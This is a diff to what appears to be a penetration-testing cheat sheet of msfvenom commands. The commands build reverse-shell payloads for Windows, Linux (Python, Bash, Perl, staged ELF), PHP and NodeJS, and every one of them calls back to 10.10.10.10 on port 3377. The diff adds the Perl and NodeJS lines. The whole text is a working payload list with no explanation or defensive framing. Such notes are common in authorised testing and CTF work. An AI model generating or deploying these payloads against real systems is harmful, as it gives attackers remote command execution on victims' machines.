@@ -10,6 +10,7 @@ msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f exe > ~/re
 ##Linux
 msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/shell.py
 msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/shell.sh
+msfvenom -p cmd/unix/reverse_perl LHOST=10.10.10.10 LPORT=3377 -f raw > shell.pl
 
 #Staged Payloads
 msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf > ~/reverse-shell/s-shell-x86.elf
@@ -37,3 +38,6 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 CMD=/bin/ba
 ##PHP
 msfvenom -p php/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/shell.php
 cat ~/reverse-shell/shell.php | pbcopy && echo '<?php ' | tr -d '\n' > ~/reverse-shell/shell.php && pbpaste >> ~/reverse-shell/shell.php
+
+##NodeJs
+msfvenom -p nodejs/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/node-shell.js
